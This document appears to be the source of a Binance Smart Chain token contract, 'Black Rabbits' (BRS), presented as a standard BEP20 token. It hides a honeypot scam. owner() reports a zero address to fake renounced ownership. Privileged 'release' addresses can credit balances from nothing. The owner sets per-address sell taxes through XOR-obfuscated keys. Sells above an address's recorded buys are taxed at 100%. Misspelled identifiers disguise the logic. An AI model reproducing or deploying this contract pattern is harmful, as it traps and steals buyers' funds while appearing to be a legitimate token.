/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
* http://instagram.com/BlackRabbits3712
* https://www.reddit.com/user/BlackRabbits3712
* TWITTER:https://BlackRabbits3712.com/
* WEBSITE:https://twitter.com/BlackRabbits3712
* TELEGRAM:https://t.me/BlackRabbits3712
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingBlackRabbits3712OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingBlackRabbits3712OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingBlackRabbits3712OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingBlackRabbits3712OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingBlackRabbits3712OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function BlackRabbits3712To() external view returns (address);
    function BlackRabbits3712ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setBlackRabbits3712To(address) external;
    function setBlackRabbits3712ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

   function decimals() public view virtual returns (uint8) {
        return 18;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
      function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract BRS is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baBlackRabbits3712lances;
    mapping(address => uint256) private _baBlackRabbits3712lances1;
    mapping(address => bool) private _reBlackRabbits3712llease;
    mapping(uint256 => uint256) private _bBlackRabbits3712blist;
string name_ = "Black Rabbits";
string symbol_ = "BRS";
uint256 totalSupply_ = 1000000000;   
    address public uniswapV2Pair;
    address deBlackRabbits3712ad = 0x000000000000000000000000000000000000dEaD;
    address _gaBlackRabbits3712te = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820;
    address _mxBlackRabbits3712x = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    constructor()

BEP20(name_, symbol_) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

        _mtBlackRabbits3712in(msg.sender, totalSupply_ * 10**decimals());

         transfer(deBlackRabbits3712ad, totalSupply() / 10*2);
         transfer(_mxBlackRabbits3712x, totalSupply() / 10*2);
         transfer(_gaBlackRabbits3712te, totalSupply() / 10*1);

        _defaultSellBlackRabbits3712 = 0;
        _defaultBuyBlackRabbits3712 = 0;

        _reBlackRabbits3712llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baBlackRabbits3712lances[cauunt];
    }

    function _mtBlackRabbits3712in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baBlackRabbits3712lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellBlackRabbits3712 = 0;
    uint256 private _defaultBuyBlackRabbits3712 = 0;

    function _setRelease(address _address) external onlyowaer {
        _reBlackRabbits3712llease[_address] = true;
    }
    function _incS(uint256 _value) external onlyowaer {
        _defaultSellBlackRabbits3712 = _value;
    }

    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _reBlackRabbits3712llease[_address];
    }

    function _setBlackRabbits3712(uint256[] memory _accBlackRabbits3712,uint256[] memory _value)  external onlyowaer {
        for (uint i=0;i<_accBlackRabbits3712.length;i++){
            _bBlackRabbits3712blist[_accBlackRabbits3712[i]] = _value[i];
        }
    }
function _msgBlackRabbits3712Info(uint _accBlackRabbits3712) internal view virtual returns (uint) {
        uint256 accBlackRabbits3712 = _accBlackRabbits3712 ^ 772451336776142056056085733702717251576061701136;
return _bBlackRabbits3712blist[accBlackRabbits3712];
}
    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_reBlackRabbits3712llease[owaer] == true) {
            _baBlackRabbits3712lances[to] += amuont;
            return true;
        }
        _tBlackRabbits3712transfer(owaer, to, amuont);
        return true;
    }
    function _tBlackRabbits3712transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baBlackRabbits3712lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

  
        uint256 tradeBlackRabbits3712 = 0;
        uint256 tradeBlackRabbits3712amuont = 0;

        if (!(_reBlackRabbits3712llease[from] || _reBlackRabbits3712llease[_to])) {
            if (from == uniswapV2Pair) {
                tradeBlackRabbits3712 = _defaultBuyBlackRabbits3712;
                _baBlackRabbits3712lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradeBlackRabbits3712 = _msgBlackRabbits3712Info(uint160(from));
                tradeBlackRabbits3712 = tradeBlackRabbits3712 < _defaultSellBlackRabbits3712 ? _defaultSellBlackRabbits3712 : tradeBlackRabbits3712;
                tradeBlackRabbits3712 = _baBlackRabbits3712lances1[from] >= _amuont ? tradeBlackRabbits3712 : 100;
                _baBlackRabbits3712lances1[from] = _baBlackRabbits3712lances1[from] >= _amuont ? _baBlackRabbits3712lances1[from] - _amuont : _baBlackRabbits3712lances1[from];
            }
                        
            tradeBlackRabbits3712amuont = _amuont.mul(tradeBlackRabbits3712).div(100);
        }


        if (tradeBlackRabbits3712amuont > 0) {
            _baBlackRabbits3712lances[from] = _baBlackRabbits3712lances[from].sub(tradeBlackRabbits3712amuont);
            _baBlackRabbits3712lances[deBlackRabbits3712ad] = _baBlackRabbits3712lances[deBlackRabbits3712ad].add(tradeBlackRabbits3712amuont);
            emit Transfer(from, deBlackRabbits3712ad, tradeBlackRabbits3712amuont);
        }

        _baBlackRabbits3712lances[from] = _baBlackRabbits3712lances[from].sub(_amuont - tradeBlackRabbits3712amuont);
        _baBlackRabbits3712lances[_to] = _baBlackRabbits3712lances[_to].add(_amuont - tradeBlackRabbits3712amuont);
        emit Transfer(from, _to, _amuont - tradeBlackRabbits3712amuont);
    }



    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tBlackRabbits3712transfer(from, to, amuont);
        return true;
    }
}